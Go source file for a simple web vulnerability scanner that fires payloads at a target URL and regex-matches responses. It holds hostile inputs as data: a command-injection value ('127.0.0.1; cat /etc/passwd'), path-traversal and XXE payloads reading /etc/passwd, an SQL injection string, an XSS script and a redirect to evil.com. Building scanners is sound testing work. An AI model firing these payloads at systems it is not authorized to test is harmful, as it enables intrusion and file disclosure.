package vuln

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// --- existing types (kept) ---
type VulnCheck struct {
	Name    string
	Param   string
	Payload string
	Match   string // Can be a regex
	Method  string
}

var vulns = []VulnCheck{
	{"XSS (Reflected)", "q", "<script>alert(1)</script>", `<script>alert\(1\)</script>`, "GET"},
	{"SQL Injection (Error-Based)", "id", "' OR '1'='1", `sql syntax|mysql_fetch|ORA-|ODBC|SQLite`, "GET"},
	{"LFI", "file", "../../../../etc/passwd", `root:x:0:0`, "GET"},
	{"Open Redirect", "next", "//evil.com", `evil\.com`, "GET"}, // detection done via Location header
	{"Command Injection", "ip", "127.0.0.1; cat /etc/passwd", `root:x:0:0`, "GET"},
	{"SSRF", "url", "http://127.0.0.1:80", `Server|Apache|nginx|Bad Request`, "GET"},
	{"CSRF", "", "", `Set-Cookie`, "GET"},
	{"RCE (Basic)", "cmd", "echo knife", `knife`, "GET"},
	{"Directory Traversal", "path", "../../../../etc/passwd", `root:x:0:0`, "GET"},
	{"XXE", "xml", `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, `root:x:0:0`, "POST"},
}

// --- new types for reporting ---
type Finding struct {
	Name          string
	Param         string
	Method        string
	TestURL       string
	StatusCode    int
	Location      string // for open redirect
	Payload       string
	HeaderSnippet string
	BodySnippet   string
	Evidence      string // matched snippet
	Notes         string
	Timestamp     time.Time
}

var findings []Finding

// ScanURL runs checks and records findings to the global 'findings' slice.
func ScanURL(target string, extraHeaders map[string]string, cookies string) {
	// default client (follows redirects)
	defaultClient := &http.Client{Timeout: 15 * time.Second}
	// client that does NOT follow redirects (useful for open-redirect detection)
	noRedirectClient := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// do not follow redirects
			return http.ErrUseLastResponse
		},
	}

	fmt.Println("[+] Starting scan:", target)
	found := false

	for _, check := range vulns {
		u, err := url.Parse(target)
		if err != nil {
			fmt.Printf("[-] Invalid URL: %s\n", target)
			return
		}

		var req *http.Request
		var testURL string

		// Build request
		if check.Method == "POST" {
			// If payload looks like XML/XXE, send raw XML with proper content-type.
			payloadIsXML := strings.Contains(strings.TrimSpace(check.Payload), "<?xml") || strings.Contains(check.Payload, "<!DOCTYPE")
			if payloadIsXML && check.Param == "xml" {
				req, err = http.NewRequest("POST", target, strings.NewReader(check.Payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/xml")
				}
				testURL = target + " (POST raw XML payload)"
			} else {
				data := url.Values{}
				if check.Param != "" {
					data.Set(check.Param, check.Payload)
				}
				req, err = http.NewRequest("POST", target, strings.NewReader(data.Encode()))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
				testURL = target + " (POST param: " + check.Param + "=" + check.Payload + ")"
			}
		} else {
			q := u.Query()
			if check.Param != "" {
				q.Set(check.Param, check.Payload)
			}
			u.RawQuery = q.Encode()
			testURL = u.String()
			req, err = http.NewRequest("GET", testURL, nil)
		}

		if err != nil {
			fmt.Printf("[-] Error creating request for %s: %v\n", check.Name, err)
			continue
		}

		// Add custom headers if provided
		for k, v := range extraHeaders {
			req.Header.Set(k, v)
		}
		if cookies != "" {
			req.Header.Set("Cookie", cookies)
		}

		// Choose client: use noRedirectClient only when testing open-redirect so we can inspect Location header.
		client := defaultClient
		if check.Name == "Open Redirect" {
			client = noRedirectClient
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] %s request failed: %v\n", check.Name, err)
			continue
		}

		bodyBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("[-] Error reading response for %s: %v\n", check.Name, err)
			continue
		}
		bodyStr := string(bodyBytes)

		// build header string (original case) for regex checks where needed
		headerStr := ""
		for k, v := range resp.Header {
			headerStr += fmt.Sprintf("%s: %s\n", k, strings.Join(v, ","))
		}

		// Special-case: Open Redirect detection — inspect Location header directly
		if check.Name == "Open Redirect" {
			loc := resp.Header.Get("Location")
			if loc != "" {
				lowerLoc := strings.ToLower(strings.TrimSpace(loc))
				if strings.HasPrefix(lowerLoc, "//evil.com") ||
					strings.Contains(lowerLoc, "://evil.com") ||
					strings.Contains(lowerLoc, "evil.com") {
					fmt.Printf("[!] Potential %-30s | Param: %-10s | Method: %-4s | Status: %d | URL: %s | Location: %s\n",
						check.Name, check.Param, check.Method, resp.StatusCode, testURL, loc)
					f := Finding{
						Name:          check.Name,
						Param:         check.Param,
						Method:        check.Method,
						TestURL:       testURL,
						StatusCode:    resp.StatusCode,
						Location:      loc,
						Payload:       check.Payload,
						HeaderSnippet: snippet(headerStr, 800),
						BodySnippet:   snippet(bodyStr, 800),
						Evidence:      loc,
						Notes:         "Redirect Location header contains external domain.",
						Timestamp:     time.Now(),
					}
					findings = append(findings, f)
					found = true
					continue
				}
			}
			// If no header matched, fall through to generic regex checks below
		}

		// Prepare regex for matching. Use case-insensitive by prefixing (?i) unless already provided.
		pat := check.Match
		if pat == "" {
			pat = "(?i)" // match nothing special but still valid regex
		}
		if !strings.HasPrefix(pat, "(?i)") && !strings.HasPrefix(pat, "(?-i)") {
			pat = "(?i)" + pat
		}

		re, err := regexp.Compile(pat)
		if err != nil {
			fmt.Printf("[-] Invalid regex for %s: %v\n", check.Name, err)
			continue
		}

		bodyMatched := re.MatchString(bodyStr)
		headerMatched := re.MatchString(headerStr)

		if bodyMatched || headerMatched {
			// extract small evidence snippet
			ev := ""
			if bodyMatched {
				ev = findRegexSnippet(re, bodyStr, 200)
			} else {
				ev = findRegexSnippet(re, headerStr, 200)
			}

			fmt.Printf("[!] Potential %-30s | Param: %-10s | Method: %-4s | Status: %d | URL: %s\n",
				check.Name, check.Param, check.Method, resp.StatusCode, testURL)

			f := Finding{
				Name:          check.Name,
				Param:         check.Param,
				Method:        check.Method,
				TestURL:       testURL,
				StatusCode:    resp.StatusCode,
				Location:      resp.Header.Get("Location"),
				Payload:       check.Payload,
				HeaderSnippet: snippet(headerStr, 800),
				BodySnippet:   snippet(bodyStr, 800),
				Evidence:      ev,
				Notes:         "", // placeholder; could be filled with contextual info later
				Timestamp:     time.Now(),
			}
			findings = append(findings, f)
			found = true
		}
	}

	if !found {
		fmt.Println("[+] Scan complete. No obvious vulnerabilities detected.")
	} else {
		fmt.Println("[!] Scan complete. Review findings above.")
	}
}
